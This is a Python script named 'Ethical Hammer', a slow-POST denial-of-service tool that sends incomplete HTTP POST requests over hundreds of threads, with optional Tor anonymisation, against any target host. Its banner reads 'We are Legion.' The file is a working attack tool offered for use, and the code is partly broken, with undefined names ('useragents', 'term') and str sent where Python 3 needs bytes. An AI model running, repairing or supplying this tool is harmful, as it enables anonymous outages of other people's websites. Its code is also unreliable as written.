#!/usr/bin/python3
import time
import sys
import random
import getopt
import socks
import string
import terminal
from threading import Thread

class EthicalHammer(Thread):
    def __init__(self, host, port, tor):
        super(EthicalHammer, self).__init__()
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True

    def _send_http_post(self, pause=10):
        global stop_now

        headers = (
            "POST / HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Connection: keep-alive\r\n"
            "Keep-Alive: 900\r\n"
            "Content-Length: 10000\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
            (self.host, random.choice(useragents))
        )

        try:
            self.socks.send(headers)
            for _ in range(9999):
                if stop_now:
                    self.running = False
                    break
                payload = random.choice(string.ascii_letters + string.digits)
                print(term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % payload + term.NORMAL)
                self.socks.send(payload)
                time.sleep(random.uniform(0.1, 3))
        except Exception as e:
            print("Error during POST:", e)

    def run(self):
        while self.running:
            try:
                if self.tor:
                    self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                    time.sleep(1)
                self.socks.connect((self.host, self.port))
                print(term.BOL + term.UP + term.CLEAR_EOL + "Connected to host..." + term.NORMAL)
                self._send_http_post()
            except Exception as e:
                print("Error:", e)
                time.sleep(1)
                sys.exit()

def usage():
    print("./ethical_hammer.py -t <target> [-r <threads> -p <port> -T -h]")
    print(" -t|--target <Hostname|IP>")
    print(" -r|--threads <Number of threads> Defaults to 256")
    print(" -p|--port <Web Server Port> Defaults to 80")
    print(" -T|--tor Enable anonymizing through Tor on 127.0.0.1:9150")
    print(" -h|--help Shows this help\n")
    print("E.g., ./ethical_hammer.py -t 192.168.1.100 -r 256\n")

def main(argv):
    try:
        opts, _ = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 256
    tor = False
    port = 80

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        if opt in ("-T", "--tor"):
            tor = True
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-r", "--threads"):
            threads = int(arg)
        elif opt in ("-p", "--port"):
            port = int(arg)

    if not target or threads <= 0:
        usage()
        sys.exit(-1)

    print(term.DOWN + term.RED + "/*" + term.NORMAL)
    print(term.RED + f" * Target: {target} Port: {port}" + term.NORMAL)
    print(term.RED + f" * Threads: {threads} Tor: {tor}" + term.NORMAL)
    print(term.RED + " * Give 20 seconds without Tor or 40 with before checking the site" + term.NORMAL)
    print(term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)

    thread_list = []
    for _ in range(threads):
        t = EthicalHammer(target, port, tor)
        thread_list.append(t)
        t.start()

    while thread_list:
        try:
            thread_list = [t.join(1) for t in thread_list if t is not None and t.is_alive()]
        except KeyboardInterrupt:
            print("\nShutting down threads...\n")
            for t in thread_list:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print("\n/*")
    print(" *" + term.RED + " Ethical Hammer " + term.NORMAL)
    print(" * Slow POST DoS Testing Tool")
    print(" * entropy [at] phiral.net")
    print(" * Anon-ymized via Tor")
    print(" * We are Legion.")
    print(" */\n")

    main(sys.argv[1:])
